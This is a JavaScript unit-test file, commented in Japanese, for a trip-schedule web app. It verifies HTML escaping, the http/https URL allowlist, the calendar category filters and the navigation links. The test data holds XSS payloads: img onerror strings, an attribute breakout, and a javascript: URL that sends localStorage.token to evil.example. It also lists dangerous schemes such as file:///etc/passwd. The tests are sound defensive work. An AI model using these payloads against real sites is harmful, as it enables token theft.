/**
 * イベント由来の文字列が innerHTML へ生のまま流れ込まないことを、
 * 3 つの描画経路すべてについて確かめる。
 *
 * Phase A の events.json は手書き・コミット済みなので実害はないが、
 * Phase B ではブラウザで入力した文字列を GitHub Contents API 経由で
 * 書き戻す。そのリポジトリ書き込み権限を持つトークンを抱えたページ自身で
 * 描画する以上、ここが破れるとトークンが盗まれる。
 */
import test from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, safeHttpUrl } from "../assets/js/dom.js";
import { renderEventDetail } from "../assets/js/sheet.js";
import { popupHtml, locationRowHtml } from "../assets/js/map.js";
import { renderCalendar } from "../assets/js/calendar.js";
import { renderNav } from "../assets/js/nav.js";

/** レビューで実際に window.__pwned = 1 まで到達したペイロード。 */
const PAYLOAD = '<img src=x onerror="window.__pwned=1">';
/** 属性値から抜け出す形のペイロード（src="${...}" が素の代入だと成立する）。 */
const ATTR_PAYLOAD = 'x" onerror="window.__pwned=1';

const DAYS = [
  { date: "8/12", dow: "水" },
  { date: "8/13", dow: "木" },
];

const evilEvent = () => ({
  id: "ev-evil",
  cat: "cat-sight",
  title: PAYLOAD,
  allDay: false,
  startDay: 0,
  endDay: 0,
  start: 10,
  end: 11,
  location: PAYLOAD,
  lat: 13.7,
  lng: 100.5,
  url: ATTR_PAYLOAD,
  notes: PAYLOAD,
  image: ATTR_PAYLOAD,
  imagePos: ATTR_PAYLOAD,
});

/**
 * 実行可能な形の断片が残っていないこと。
 * 「onerror という語が出てこない」ではなく「HTML として解釈されうる
 * 素の < > " が残っていない」を見る（正しくエスケープされた出力にも
 * onerror=&quot; という文字列自体は現れるため）。
 */
function assertInert(html, where) {
  assert.ok(!html.includes(PAYLOAD), `${where}: ペイロードが素で残っています`);
  assert.ok(!html.includes(ATTR_PAYLOAD), `${where}: 属性用ペイロードが素で残っています`);
  // 素の < でタグが始まっていない
  assert.doesNotMatch(html, /<img\s+src=x/i, `${where}: <img> タグが生きています`);
  // 素のクォートで属性が始まっていない（&quot; ならエスケープ済み）
  assert.doesNotMatch(html, /onerror\s*=\s*["']/i, `${where}: onerror 属性が生きています`);
}

test("escapeHtml は HTML とも属性とも解釈されうる文字をすべて変換する", () => {
  assert.equal(escapeHtml('<&>"\''), "&lt;&amp;&gt;&quot;&#39;");
  assert.equal(escapeHtml(PAYLOAD), "&lt;img src=x onerror=&quot;window.__pwned=1&quot;&gt;");
  // 数値や null も落ちずに文字列化する（lat / lng を通すため）
  assert.equal(escapeHtml(13.7), "13.7");
});

test("renderEventDetail: イベント文字列がすべて無害化される", () => {
  const html = renderEventDetail(evilEvent(), DAYS);
  assertInert(html, "renderEventDetail");
  // 素通ししているのではなく、確かにエスケープ済みの形で載っていること
  assert.ok(html.includes(escapeHtml(PAYLOAD)), "タイトルが本文に出ていません");
});

test("renderEventDetail: 日付ラベルもエスケープされる", () => {
  const html = renderEventDetail({ ...evilEvent(), endDay: 1 }, [
    { date: PAYLOAD, dow: PAYLOAD },
    { date: PAYLOAD, dow: PAYLOAD },
  ]);
  assertInert(html, "renderEventDetail(days)");
});

/* ──────────────────────────────────────────────────────────
   スキーム。escapeHtml が変換するのは & < > " ' の 5 文字だけなので、
   その 5 文字を 1 つも含まないペイロード（javascript: … ）は
   これまでのエスケープ検査を全部すり抜けて href に載っていた。
   ────────────────────────────────────────────────────────── */

/** クォートもタグも使わない。escapeHtml を通しても 1 文字も変わらない。 */
const SCHEME_PAYLOAD = "javascript:fetch(`https://evil.example/?t=`+localStorage.token)";

test("エスケープだけではスキーム攻撃を止められない（前提の確認）", () => {
  // このテストが落ちるようになったら、下の許可リストの前提が変わっている
  assert.equal(escapeHtml(SCHEME_PAYLOAD), SCHEME_PAYLOAD);
});

test("safeHttpUrl は http / https だけを通す", () => {
  assert.equal(safeHttpUrl("https://example.com/a?b=1"), "https://example.com/a?b=1");
  assert.equal(safeHttpUrl("http://example.com/"), "http://example.com/");
  for (const bad of [
    SCHEME_PAYLOAD,
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    "  javascript:alert(1)  ",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "/relative/path.html",
    "example.com",
    "",
    "   ",
    null,
    undefined,
    123,
  ]) {
    assert.equal(safeHttpUrl(bad), null, `通してはいけない値です: ${JSON.stringify(bad)}`);
  }
});

test("renderEventDetail: javascript: の url をクリック可能なリンクにしない", () => {
  const html = renderEventDetail({ ...evilEvent(), url: SCHEME_PAYLOAD }, DAYS);
  assert.doesNotMatch(
    html,
    /href\s*=\s*["']?\s*javascript:/i,
    "javascript: が href に載っています"
  );
  assert.doesNotMatch(html, /<a\b/i, "弾いた URL がリンクとして描かれています");
  // 消さずに素のテキストとして見せる（url が空だったのか弾かれたのかを区別できるように）
  assert.match(html, /http \/ https のみ/, "弾いた理由が表示されていません");
  assert.ok(html.includes(escapeHtml(SCHEME_PAYLOAD)), "値そのものが表示されていません");
});

test("renderEventDetail: http / https の url はリンクになる", () => {
  const html = renderEventDetail({ ...evilEvent(), url: "https://example.com/x" }, DAYS);
  assert.match(html, /<a href="https:\/\/example\.com\/x" target="_blank" rel="noopener">/);
});

test("renderEventDetail: url が空なら Link 行そのものを出さない", () => {
  const html = renderEventDetail({ ...evilEvent(), url: "" }, DAYS);
  assert.doesNotMatch(html, /Link/);
});

test("popupHtml: タイトルと場所が無害化される", () => {
  const html = popupHtml(evilEvent());
  assertInert(html, "popupHtml");
  assert.ok(html.includes(escapeHtml(PAYLOAD)));
});

test("locationRowHtml: タイトル・画像 URL・日付が無害化される", () => {
  const html = locationRowHtml(evilEvent(), { date: PAYLOAD, dow: PAYLOAD }, "#123456");
  assertInert(html, "locationRowHtml");
});

test("locationRowHtml: 画像が無い行は <img> を出さない", () => {
  // src="" はページ自身の URL に解決され、HTML をもう一度画像として取得しにいく
  const html = locationRowHtml({ ...evilEvent(), image: "" }, DAYS[0], "#123456");
  assert.doesNotMatch(html, /<img/, "画像が無いのに <img> が出ています");
  assert.match(html, /class="loc__thumbwrap"/, "サムネイル枠自体は残すこと");
});

test("locationRowHtml: 画像がある行は src に載せる", () => {
  const html = locationRowHtml({ ...evilEvent(), image: "a.jpg" }, DAYS[0], "#123456");
  assert.match(html, /<img class="loc__thumb" src="a\.jpg"/);
});

/* ──────────────────────────────────────────────────────────
   renderCalendar は DOM を組み立てるので、createElement だけを備えた
   最小スタブを噛ませて「どの文字列がどの sink に入ったか」を記録する。
   ────────────────────────────────────────────────────────── */
function installDomStub() {
  const htmlSinks = [];
  const textSinks = [];

  const makeNode = (tag) => {
    let text = "";
    let html = "";
    const node = {
      tag,
      className: "",
      title: "",
      tabIndex: -1,
      children: [],
      attrs: {},
      // makeSelectable が data-ev-id（保存後にフォーカスを戻す目印）を書く
      dataset: {},
      style: { _props: {}, setProperty(k, v) { this._props[k] = String(v); } },
      appendChild(child) { this.children.push(child); return child; },
      setAttribute(k, v) { this.attrs[k] = String(v); },
      addEventListener() {},
    };
    Object.defineProperty(node, "textContent", {
      get: () => text,
      set: (v) => { text = String(v); textSinks.push(text); },
    });
    Object.defineProperty(node, "innerHTML", {
      get: () => html,
      set: (v) => { html = String(v); htmlSinks.push(html); },
    });
    return node;
  };

  const previous = globalThis.document;
  globalThis.document = { createElement: makeNode };
  return {
    htmlSinks,
    textSinks,
    makeNode,
    restore: () => { globalThis.document = previous; },
  };
}

function renderWithStub(days, events, options = {}) {
  const stub = installDomStub();
  try {
    const mount = stub.makeNode("div");
    renderCalendar({
      mount,
      days,
      events,
      viewStart: 6,
      viewEnd: 22,
      hiddenCats: new Set(),
      onSelect: () => {},
      ...options,
    });
    return { mount, htmlSinks: stub.htmlSinks, textSinks: stub.textSinks };
  } finally {
    stub.restore();
  }
}

/** スタブが作ったツリー全体を平らにする（描画結果を数えるため）。 */
function flatten(node, out = []) {
  out.push(node);
  for (const child of node.children ?? []) flatten(child, out);
  return out;
}

/** className が prefix で始まるノードの className 一覧。 */
const classNames = (mount, prefix) =>
  flatten(mount)
    .map((n) => n.className)
    .filter((c) => typeof c === "string" && c.startsWith(prefix));

test("renderCalendar: タイトルは textContent 経由でしか入らない", () => {
  const timed = evilEvent();
  const allDay = { ...evilEvent(), id: "ev-evil2", allDay: true };
  delete allDay.start;
  delete allDay.end;

  const { htmlSinks, textSinks } = renderWithStub(DAYS, [timed, allDay]);

  // スタブが機能していること（何も記録されないまま素通りするのを防ぐ）
  assert.ok(htmlSinks.length >= 3, `innerHTML の記録が ${htmlSinks.length} 件しかありません`);
  assert.ok(textSinks.length >= 5, `textContent の記録が ${textSinks.length} 件しかありません`);

  for (const html of htmlSinks) assertInert(html, "renderCalendar innerHTML");
  // 時間指定ブロックと終日ピルの両方でタイトルが出ていること
  assert.equal(textSinks.filter((t) => t === PAYLOAD).length, 2, "タイトルが 2 か所に出るはず");
});

test("renderCalendar: 列数を days の件数から供給する", () => {
  const ev = (startDay) => ({
    id: `ev-${startDay}`, cat: "cat-food", title: `t${startDay}`,
    allDay: false, startDay, endDay: startDay, start: 9, end: 10,
  });
  const days7 = Array.from({ length: 7 }, (_, i) => ({ date: `8/${12 + i}`, dow: "水" }));

  const six = renderWithStub(DAYS.concat(days7.slice(0, 4)), [ev(0)]);
  assert.equal(six.mount.style._props["--day-count"], "6");

  const seven = renderWithStub(days7, [ev(6)]);
  assert.equal(seven.mount.style._props["--day-count"], "7");
});

/* ──────────────────────────────────────────────────────────
   カテゴリの表示・非表示。2026-08-10 に「1 つだけ表示」から
   「hiddenCats に入っているものを隠す」へ契約を変えた。
   時間指定ブロック（本体）と終日ピル（All day 行）は別の経路なので、
   両方が同じ規則で隠れることを見る ── 片方だけ直す改変を通さないため。
   ────────────────────────────────────────────────────────── */

const FILTER_DAYS = [{ date: "8/12", dow: "水" }];

const FILTER_EVENTS = [
  { id: "t-food", cat: "cat-food", title: "昼食", allDay: false, startDay: 0, endDay: 0, start: 12, end: 13 },
  { id: "t-sight", cat: "cat-sight", title: "寺院", allDay: false, startDay: 0, endDay: 0, start: 14, end: 15 },
  { id: "a-hotel", cat: "cat-hotel", title: "ホテル", allDay: true, startDay: 0, endDay: 0 },
  { id: "a-food", cat: "cat-food", title: "朝食付き", allDay: true, startDay: 0, endDay: 0 },
];

test("renderCalendar: hiddenCats が空なら全カテゴリを描く", () => {
  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, { hiddenCats: new Set() });
  assert.deepEqual(classNames(mount, "ev "), ["ev cat-food", "ev cat-sight"]);
  assert.deepEqual(classNames(mount, "allday-pill "), [
    "allday-pill cat-hotel",
    "allday-pill cat-food",
  ]);
});

test("renderCalendar: hiddenCats は時間指定ブロックを隠す", () => {
  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, {
    hiddenCats: new Set(["cat-sight"]),
  });
  assert.deepEqual(classNames(mount, "ev "), ["ev cat-food"], "本体が隠れていません");
});

test("renderCalendar: hiddenCats は終日ピルも隠す", () => {
  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, {
    hiddenCats: new Set(["cat-hotel"]),
  });
  assert.deepEqual(
    classNames(mount, "allday-pill "),
    ["allday-pill cat-food"],
    "All day 行が隠れていません"
  );
  // 終日だけを隠しても時間指定ブロックは残る（経路が混ざっていないこと）
  assert.deepEqual(classNames(mount, "ev "), ["ev cat-food", "ev cat-sight"]);
});

test("renderCalendar: 既定で宿泊を隠す想定どおり、All day 行から宿泊だけが消える", () => {
  // schedule.js の HIDDEN_BY_DEFAULT が cat-hotel を伏せる。その見え方を固定する
  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, {
    hiddenCats: new Set(["cat-hotel"]),
  });
  assert.ok(
    !classNames(mount, "allday-pill ").some((c) => c.includes("cat-hotel")),
    "宿泊の終日ピルが残っています"
  );
});

test("renderCalendar: 全カテゴリを隠すと両方とも空になる", () => {
  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, {
    hiddenCats: new Set(["cat-food", "cat-sight", "cat-hotel"]),
  });
  assert.deepEqual(classNames(mount, "ev "), []);
  assert.deepEqual(classNames(mount, "allday-pill "), []);
  // 行や列の骨格は残る（絞り込みでカレンダーごと消えない）
  assert.equal(classNames(mount, "cal__col").length, 1);
  assert.equal(classNames(mount, "cal__allday-cell").length, 1);
});

/* ──────────────────────────────────────────────────────────
   ナビ。innerHTML への代入 1 つで完結するので、
   { innerHTML: "" } だけのスタブで検証できる。
   ────────────────────────────────────────────────────────── */

const navHtml = (current) => {
  const mount = { innerHTML: "" };
  renderNav(mount, current);
  return mount.innerHTML;
};

test("renderNav: 3 ページ分のリンクとホームを出す", () => {
  const html = navHtml(null);
  for (const href of ["index.html", "schedule.html", "packing.html", "souvenirs.html"]) {
    assert.ok(html.includes(`href="${href}"`), `${href} へのリンクがありません`);
  }
  // nav__links（囲みの div）に釣られないよう、直後の文字まで見る
  assert.equal(html.match(/class="nav__link[" ]/g).length, 3);
});

test("renderNav: 取りやめたデータ検索を出さない", () => {
  const html = navHtml(null);
  assert.ok(!html.includes("archive.html"));
  assert.ok(!html.includes("データ検索"));
});

test("renderNav: current のページだけに is-current と aria-current が付く", () => {
  const html = navHtml("schedule");
  assert.match(html, /class="nav__link is-current"[\s\S]*?href="schedule\.html" aria-current="page"/);
  assert.equal(html.match(/is-current/g).length, 1, "is-current が 1 つではありません");
  assert.equal(html.match(/aria-current/g).length, 1, "aria-current が 1 つではありません");
});

test("renderNav: current が null / 未知なら is-current も aria-current も付かない", () => {
  for (const current of [null, undefined, "packing-list"]) {
    const html = navHtml(current);
    assert.doesNotMatch(html, /is-current/, `current=${current}`);
    assert.doesNotMatch(html, /aria-current/, `current=${current}`);
  }
});

test("renderNav: current を変えると付く位置も変わる", () => {
  // is-current が常に同じリンクへ付く（＝比較が死んでいる）実装を弾く
  for (const [key, href] of [
    ["schedule", "schedule.html"],
    ["packing", "packing.html"],
    ["souvenirs", "souvenirs.html"],
  ]) {
    const html = navHtml(key);
    assert.match(
      html,
      new RegExp(`is-current"[\\s\\S]*?href="${href.replace(".", "\\.")}"`),
      `${key} で is-current が ${href} に付いていません`
    );
  }
});
